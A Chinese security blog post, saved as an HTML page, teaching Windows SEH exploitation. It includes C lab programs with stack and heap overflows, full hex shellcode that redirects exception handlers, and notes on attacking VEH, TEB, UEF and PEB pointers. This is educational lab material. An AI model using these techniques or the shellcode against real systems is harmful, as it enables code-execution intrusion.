@@ -1,0 +1,1431 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="windows," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="1. S.E.H概述SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。 几个要点：  SEH结构体放在系统栈中 当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理 如果程序源代码中使用try{}except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SE">
+<meta name="keywords" content="windows">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows 异常处理中的漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2017/06/29/windows-异常处理中的漏洞利用/index.html">
+<meta property="og:site_name" content="上善若水">
+<meta property="og:description" content="1. S.E.H概述SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。 几个要点：  SEH结构体放在系统栈中 当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理 如果程序源代码中使用try{}except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SE">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-28/seh.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2017-06-28/unwind.jpg">
+<meta property="og:updated_time" content="2017-08-29T12:39:11.189Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows 异常处理中的漏洞利用">
+<meta name="twitter:description" content="1. S.E.H概述SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。 几个要点：  SEH结构体放在系统栈中 当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理 如果程序源代码中使用try{}except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SE">
+<meta name="twitter:image" content="http://yoursite.com/images/2017-06-28/seh.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/06/29/windows-异常处理中的漏洞利用/"/>
+
+
+
+
+
+  <title>windows 异常处理中的漏洞利用 | 上善若水</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">上善若水</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/29/windows-异常处理中的漏洞利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">windows 异常处理中的漏洞利用</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-29T20:21:31+08:00">
+                2017-06-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="1-S-E-H概述"><a href="#1-S-E-H概述" class="headerlink" title="1. S.E.H概述"></a>1. S.E.H概述</h3><p>SEH即异常处理结构体(Structure Exception Handler)，其中包含两个DWORD指针：SEH链表指针和异常处理函数句柄。</p>
+<p>几个要点：</p>
+<ol>
+<li>SEH结构体放在系统栈中</li>
+<li>当线程初始化时，会自动向栈中安装一个SEH，作为线程默认的异常处理</li>
+<li>如果程序源代码中使用<strong>try{}</strong>except{}或者Assert宏等异常处理机制，编译器将最终将通过向当前函数栈帧中安装一个SEH来实现异常处理</li>
+<li>栈中一般会同时存在多个SEH</li>
+<li>栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB(线程环境块)0字节偏移处的指针标识</li>
+<li>当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的SEH，使用异常处理函数句柄所指向的代码来处理异常。</li>
+<li>当离“事故现场”最近的异常处理函数运行失效时，将顺着SEH链表依次尝试其他的异常处理函数</li>
+<li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通过这个函数弹出一个对话框，然后强制关闭程序。</li>
+</ol>
+<p><img src="/images/2017-06-28/seh.jpg" alt="SEH原理图"></p>
+<p>利用SEH的原理：</p>
+<ol>
+<li>SEH放在栈内，可以缓冲区淹没SEH</li>
+<li>精心制造溢出数据可以把SEH中异常处理函数的入口地址更改为shellcode的起始地址</li>
+<li>溢出后错误的栈帧或堆块数据往往会触发异常</li>
+<li>在Windows开始处理溢出的异常时，会错误地把shellcode当作异常处理函数而执行</li>
+</ol>
+<h3 id="2-栈溢出中利用SEH"><a href="#2-栈溢出中利用SEH" class="headerlink" title="2. 栈溢出中利用SEH"></a>2. 栈溢出中利用SEH</h3><h4 id="2-1-获取shellcode起始地址和SEH地址"><a href="#2-1-获取shellcode起始地址和SEH地址" class="headerlink" title="2.1 获取shellcode起始地址和SEH地址"></a>2.1 获取shellcode起始地址和SEH地址</h4><p>测试代码</p>
+<pre><code>
+#include <windows.h>
+#include <stdio.h>
+
+char shellcode[] = "\x90\x90\x90\x90";
+
+
+DWORD MyExceptionhandler(void)
+{
+    printf("got an exception,  press Enter to kill process!\n");
+    getchar();
+    ExitProcess(1);
+    return 1;
+}
+
+void test(char *input)
+{
+    char buf[200];
+    int zero = 0;
+    __asm int 3;        // used to break process for debug
+    __try
+    {
+        strcpy(buf, input);  // overrun the stack
+        zero = 4/zero;        // generate an exception
+    }
+    __except(MyExceptionhandler()){}
+}
+
+void main()
+{
+    test(shellcode);
+}
+</stdio.h></windows.h></code></pre>
+
+<p><b>根据Ollydbg得到结论</b></p>
+<font color="#f00">shellcode起始位置为0x0012FE48<br>离栈顶栈顶最近的SEH链表指针地址为0x0012FF18，其异常处理函数句柄地址为0x0012FF1C<br>shellcode起始地址与异常处理句柄地址之间共有212个字节间隙，也就是说，超出缓冲区8字节后的部分将覆盖SEH链的第一个SEH：由于SEH链表指针为0x90909090，所以为无效地址，系统为默认其为最终的异常处理；而而处理函数句柄内的地址是shellcode起始地址，那么就会跳转至此进行函数执行。</font>
+
+<h4 id="2-2-编写shellcode"><a href="#2-2-编写shellcode" class="headerlink" title="2.2 编写shellcode"></a>2.2 编写shellcode</h4><pre><code>
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x48\xFE\x12\x00";
+
+</code></pre>
+
+<p>注意在执行的时候去掉__asm int 3调试</p>
+<h3 id="3-堆溢出中利用SEH"><a href="#3-堆溢出中利用SEH" class="headerlink" title="3. 堆溢出中利用SEH"></a>3. 堆溢出中利用SEH</h3><pre><code>
+#include &lt;windows.h&gt;
+
+char shellcode[] = 
+    "\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // heap of the ajacent free block(尾块)
+    "\x88\x06\x36\x00"        //0x00360688 is the address of shellcode in first Heapblock
+    "\x90\x90\x90\x90";        //target of DWORD SHOOT
+
+DWORD MyExceptionhandler(void)
+{
+    ExitProcess(1);
+    return 0;
+}
+
+int main()
+{
+    HLOCAL h1=0, h2=0;
+    HANDLE hp;
+    hp = HeapCreate(0, 0x1000, 0x10000);
+    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
+    memcpy(h1, shellcode, 0x200);    // overflow here
+                                    // noticed 0x200 means 512
+    __asm int 3                // used to break the process
+    __try
+    {
+        h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
+    }
+    __except(MyExceptionhandler()){}
+    return 0;
+}
+
+</code></pre>
+
+<p>实验方案：</p>
+<ol>
+<li>溢出第一个堆块的数据将写入后面的空闲堆块，第二次分配的时候发生DWORD SHOOT。</li>
+<li>将SEH的异常回调函数地址作为DWORD SHOOT目标，将其替换为shellcode入口地址，异常发生后，操作系统将错误地把shellcode当作异常处理函数而执行。</li>
+</ol>
+<p>得到的DWORD的目标地址后，就可以去掉中断指令，更改DWORD SHOOT的目标地址，重新执行</p>
+<font color="#f00">遗憾的是，该实验我做了很多次，最后都是无功而返，没有试验现象，到目前为止不知道原因！！！！</font>
+
+<h3 id="4-Windows异常处理"><a href="#4-Windows异常处理" class="headerlink" title="4. Windows异常处理"></a>4. Windows异常处理</h3><h4 id="4-1-不同级别的SEH"><a href="#4-1-不同级别的SEH" class="headerlink" title="4.1 不同级别的SEH"></a>4.1 不同级别的SEH</h4><p>异常处理流程：</p>
+<ul>
+<li>首先执行线程中距离栈顶最近的SEH异常处理函数</li>
+<li>若失败，则依次尝试执行SEH链表中的后续异常处理函数</li>
+<li>若SEH链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理</li>
+<li>若仍然失败，系统默认的异常处理函数将被调用，程序崩溃窗口将被弹出</li>
+</ul>
+<h4 id="4-2-线程的异常处理"><a href="#4-2-线程的异常处理" class="headerlink" title="4.2 线程的异常处理"></a>4.2 线程的异常处理</h4><p>线程中用于处理异常的回调函数有4参数：</p>
+<ol>
+<li>pExcept：指向非常重要的结构体EXCEPTION_RECORD。该结构体包含若干与异常相关的信息，如异常的类型、异常发生的地址等</li>
+<li>pFrame：指向栈帧中SEH结构体</li>
+<li>pContext：指向Context结构体。该结构体中包含所有寄存器的状态</li>
+<li>pDispatch：位置用途</li>
+</ol>
+<p>返回值：<br>0（ExceptionContinueExecution）：异常被成功处理，将返回原程序发生异常的地方，继续执行后续指令。<br>1（ExceptionContinueSearch）：代表异常处理失败，将顺着SEH链表搜索其他可用于异常处理的函数并尝试处理。</p>
+<p><img src="/images/2017-06-28/unwind.jpg" alt="unwind处理过程"></p>
+<p>异常处理函数的第一轮调用用来尝试处理异常，而第二轮的unwind调用时，往往执行的是释放资源等操作。</p>
+<h4 id="4-3-进程的异常处理"><a href="#4-3-进程的异常处理" class="headerlink" title="4.3 进程的异常处理"></a>4.3 进程的异常处理</h4><p>如果异常没被线程的异常处理函数或调试器处理掉，将交给进程中的异常处理函数。</p>
+<p>通过API函数SetUnhandledExceptionFilter来注册，其是kernel32.dll的导出函数。</p>
+<font color#f00="">提示：把线程异常处理对应代码中<strong>try{}</strong>except(){}或者Assert等语句，把进程的异常处理对应于函数SetUnhandledExceptionFilter</font>
+
+<p>返回值：</p>
+<ul>
+<li>1(EXCEPTION_EXECUTE_HANDLER):表示错误得到正确的处理，程序将退出</li>
+<li>0(EXCEPTION_CONTINUE_SEARCH):无法处理错误，将错误转交给系统默认的异常处理</li>
+<li>-1(EXCEPTION_CONTINUE_EXECUTION):表示错误得到正确处理，并将继续执行下去。类似于线程的异常处理函数，系统会用回调函数会付出异常发生时的断点状况。但这时引起异常的寄存器应该已经得到了恢复。</li>
+</ul>
+<h4 id="4-4-系统默认异常处理UEF"><a href="#4-4-系统默认异常处理UEF" class="headerlink" title="4.4 系统默认异常处理UEF"></a>4.4 系统默认异常处理UEF</h4><p>如果进程异常处理失败或用户根本没有注册进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用。</p>
+<h4 id="4-5-异常处理流程总结"><a href="#4-5-异常处理流程总结" class="headerlink" title="4.5 异常处理流程总结"></a>4.5 异常处理流程总结</h4><ul>
+<li>CPU执行发生并捕获异常，内核结果进程的控制权，开始内核态的异常处理</li>
+<li>内核异常处理结束，将控制权还给ring3</li>
+<li>ring3中第一个处理异常的函数是ntdll.dll中的KiUserExceptionDispatcher()函数</li>
+<li>KiUserExceptionDispatcher()首先会检查程序是否处于调试状态。如果程序正被调试，会将异常交给调试器进行处理</li>
+<li>在非调试状态下，KiUserExceptionDispatcher()调用RtlDispatchException()函数对线程的SEH链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，以保证异常处理机制自身的完整性</li>
+<li>如果栈中所有的SEH都失败了，且用户曾经使用过SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用。</li>
+<li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理UnhandledExceptionFilter()将被调用。UEF会根据注册表里的相关信息决定是默默关闭程序，还是弹出错误对话框</li>
+</ul>
+<h3 id="5-其他异常处理机制的利用思路"><a href="#5-其他异常处理机制的利用思路" class="headerlink" title="5. 其他异常处理机制的利用思路"></a>5. 其他异常处理机制的利用思路</h3><h4 id="5-1-VEH利用"><a href="#5-1-VEH利用" class="headerlink" title="5.1 VEH利用"></a>5.1 VEH利用</h4><p>VEH（Vectored Exception Handler，向量化异常处理）</p>
+<ol>
+<li>VEH和进程异常处理类似，都是基于进程的，而且需要使用API注册回调函数</li>
+<li>可注册多个VEH。VEH结构体之间串成双向链表，因此比SEH多了一个前向指针</li>
+<li>VEH处理优先级次于调试器处理，高于SEH处理。先KiUserExceptionDispatcher，再VEH，最后SEH</li>
+<li>VEH保存在堆中</li>
+<li>unwind操作只对栈帧中的SEH链起作用，不会涉及VEH这种进程类的异常处理</li>
+</ol>
+<p><a href="/others/2017-06-28/bh-win-04-litchfield.ppt">Windows heap overfows</a><br>如果能利用堆溢出的DWORD SHOOT修改VEH头结点指针，在异常处理开始后，并能引导程序去执行shellcode</p>
+<h4 id="5-2-攻击TEB中的SEH头节点"><a href="#5-2-攻击TEB中的SEH头节点" class="headerlink" title="5.2 攻击TEB中的SEH头节点"></a>5.2 攻击TEB中的SEH头节点</h4><p>异常发生时，异常处理机制会遍历SEH链表中寻找合适的出错函数。线程SEH链通过TEB的第一个DWORD标识(fs:0)，这个指针永远指向离栈顶最近的那个SEH。如果能够修改TEB中的这个指针，在异常发生时就能将程序引导到shellcode中去执行</p>
+<p><a href="/images/2017-06-28/halvarflake-winsec02.ppt">Third Generation Exploition</a></p>
+<h4 id="5-3-攻击UEF"><a href="#5-3-攻击UEF" class="headerlink" title="5.3 攻击UEF"></a>5.3 攻击UEF</h4><p>如果能通过DWORD SHOOT把这个处理函数覆盖为shellcode的入口地址，再制造一个其他异常处理无法解决的异常，那么系统将使用UEF作为最后一根救命稻草来解决异常时，shellcode就被执行。</p>
+<h4 id="5-4-攻击PEB中的函数指针"><a href="#5-4-攻击PEB中的函数指针" class="headerlink" title="5.4 攻击PEB中的函数指针"></a>5.4 攻击PEB中的函数指针</h4><p>前面博客有讲</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows/" rel="tag"># windows</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/26/堆溢出利用（下）——-代码植入/" rel="next" title="堆溢出利用（下）—— 代码植入">
+                <i class="fa fa-chevron-left"></i> 堆溢出利用（下）—— 代码植入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/30/使用git在github上创建新工程/" rel="prev" title="使用git在github上创建新工程">
+                使用git在github上创建新工程 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.jpg"
+               alt="Introspelliam" />
+          <p class="site-author-name" itemprop="name">Introspelliam</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">128</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-S-E-H概述"><span class="nav-number">1.</span> <span class="nav-text">1. S.E.H概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-栈溢出中利用SEH"><span class="nav-number">2.</span> <span class="nav-text">2. 栈溢出中利用SEH</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-获取shellcode起始地址和SEH地址"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 获取shellcode起始地址和SEH地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-编写shellcode"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 编写shellcode</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-堆溢出中利用SEH"><span class="nav-number">3.</span> <span class="nav-text">3. 堆溢出中利用SEH</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Windows异常处理"><span class="nav-number">4.</span> <span class="nav-text">4. Windows异常处理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-不同级别的SEH"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 不同级别的SEH</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-线程的异常处理"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 线程的异常处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-3-进程的异常处理"><span class="nav-number">4.3.</span> <span class="nav-text">4.3 进程的异常处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-4-系统默认异常处理UEF"><span class="nav-number">4.4.</span> <span class="nav-text">4.4 系统默认异常处理UEF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-5-异常处理流程总结"><span class="nav-number">4.5.</span> <span class="nav-text">4.5 异常处理流程总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-其他异常处理机制的利用思路"><span class="nav-number">5.</span> <span class="nav-text">5. 其他异常处理机制的利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-VEH利用"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 